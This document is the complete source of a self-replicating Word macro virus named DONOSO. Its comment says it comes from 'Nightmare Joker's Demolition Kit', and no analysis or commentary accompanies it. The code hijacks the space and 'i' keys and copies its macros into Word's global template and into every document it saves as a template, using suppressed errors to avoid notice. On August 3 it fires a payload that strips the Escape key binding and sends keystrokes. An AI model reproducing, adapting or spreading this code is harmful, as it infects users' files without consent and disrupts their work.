   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DONOSO2"

   Public Sub MAIN()
   Dim VM1$
   Dim VM2$
   Dim NJ$
   Dim F$
   Dim A$
   On Error GoTo -1: On Error GoTo Finish

   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="DONOSO1", Add:=1, Context:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="DONOSO1", Add:=1, Context:=1
   WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="DONOSO2", Add:=1, Context:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="DONOSO2", Add:=1, Context:=1

   VM1$ = WordBasic.[WindowName$]() + ":DONOSO1"
   VM2$ = WordBasic.[WindowName$]() + ":DONOSO2"

   NJ$ = WordBasic.[MacroFileName$]("DONOSO1")
   F$ = WordBasic.[FileNameInfo$](NJ$, 5)

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.MacroCopy VM1$, "Global:DONOSO1"
       WordBasic.MacroCopy VM2$, "Global:DONOSO2"
       WordBasic.FileSaveAll 1, 1
   End If

   Finish:
   A$ = WordBasic.[FileName$]()
   If A$ = "" Then
       GoTo Finito
   Else
       WordBasic.Insert "i"
   End If

   Finito:
   If WordBasic.Month(WordBasic.Now()) = 8 And WordBasic.Day(WordBasic.Now()) = 3 Then
       WordBasic.Call "Payload"
   Else
       GoTo EndOne
   End If

   EndOne:
   End Sub

   Private Function VInstalled()
   Dim i
       VInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "DONOSO1" Then
                   VInstalled = 1
               End If
           Next i
       End If
   End Function

   Attribute VB_Name = "DONOSO1"

   Public Sub MAIN()
   Dim VM1$
   Dim VM2$
   Dim A$
   On Error GoTo -1: On Error GoTo Finish

   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="DONOSO1", Add:=1, Context:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="DONOSO1", Add:=1, Context:=1
   WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="DONOSO2", Add:=1, Context:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=73, Category:=2, Name:="DONOSO2", Add:=1, Context:=1

   VM1$ = WordBasic.[WindowName$]() + ":DONOSO1"
   VM2$ = WordBasic.[WindowName$]() + ":DONOSO2"

   If VInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:DONOSO1", VM1$
       WordBasic.MacroCopy "Global:DONOSO2", VM2$
       WordBasic.FileSaveAll 1, 0
   End If

   Finish:
   A$ = WordBasic.[FileName$]()
   If A$ = "" Then
       GoTo Finito
   Else
       WordBasic.Insert " "
   End If

   Finito:
   If WordBasic.Month(WordBasic.Now()) = 8 And WordBasic.Day(WordBasic.Now()) = 3 Then
       Payload
   Else
       GoTo EndOne
   End If

   EndOne:
   End Sub

   Private Function VInstalled()
   Dim i
       VInstalled = 0
       If WordBasic.CountMacros(1) > 0 Then
           For i = 1 To WordBasic.CountMacros(1)
               If WordBasic.[MacroName$](i, 1) = "DONOSO1" Then
                   VInstalled = 1
               End If
           Next i
       End If
   End Function

   Private Sub Payload()

   Rem A Virus from Nightmare Joker's Demolition Kit!

   On Error Resume Next

   WordBasic.ToolsCustomizeKeyboard KeyCode:=27, Category:=1, Name:="Abbrechen", Remove:=1, Context:=0

   WordBasic.SendKeys "^" + "%" + "-"
   End Sub
